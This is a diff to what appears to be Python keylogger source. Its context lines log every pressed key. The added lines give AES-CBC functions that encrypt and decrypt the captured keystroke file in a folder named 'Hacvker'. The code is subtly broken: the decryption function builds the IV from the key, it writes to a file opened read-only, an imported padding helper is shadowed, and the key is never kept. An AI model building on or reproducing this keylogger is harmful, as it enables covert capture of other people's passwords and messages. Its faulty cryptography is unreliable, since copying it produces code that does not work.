@@ -13,6 +13,9 @@ import datetime
 import threading
 import os
 import numpy as np
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad
 import cv2
 import random
 import time
@@ -46,6 +49,49 @@ if not os.path.exists(date_dir):
 
 def output_key(key):
     logging.info(f"Key pressed: {key}")
+
+def pad(data):
+    padding_length = 16 - len(data) % 16
+    padding = bytes([padding_length] * padding_length)
+    return data + padding
+
+def unpad(data):
+    padding_length = data[-1]
+    if padding_length < 1 or padding_length > 16:
+        raise ValueError("Invalid padding encountered")
+    return data[:-padding_length]
+def encrypt_file():
+    key = os.urandom(32)
+    iv = os.urandom(16)
+    cipher = AES.new(key,AES.MODE_CBC,iv)
+    try:
+        with open("D:/Hacvker/keyLog.txt",'rb') as f:
+            plaintext = f.read()
+        padded_plaintext = pad(plaintext)
+        ciphertext = cipher.encrypt(padded_plaintext)
+        with open("D:/Hacvker/keyLog.txt", 'wb') as f:
+            f.write(ciphertext)
+        encoded_key = key.hex()
+        encoded_iv = iv.hex()
+        return encoded_key, encoded_iv
+    except Exception as e:
+        print(f"An error occurred during encryption: {e}")
+        return None, None
+def decrypt_file(key,iv):
+    try:
+        decoded_key = bytes.fromhex(key)
+        iv_bytes = bytes.fromhex(key)
+        cipher = AES.new(decoded_key, AES.MODE_CBC, iv_bytes)
+        with open("D:/Hacvker/keyLog.txt", 'rb') as f:
+            encrypted_data = f.read()
+        decrypted_data = unpad(cipher.decrypt(encrypted_data))
+        with open("D:/Hacvker/keyLog.txt",'rb') as f:
+            f.write(decrypted_data)
+
+
+    except Exception as e:
+        print(f"An error occurred during decryption: {e}")
+
 
 
 
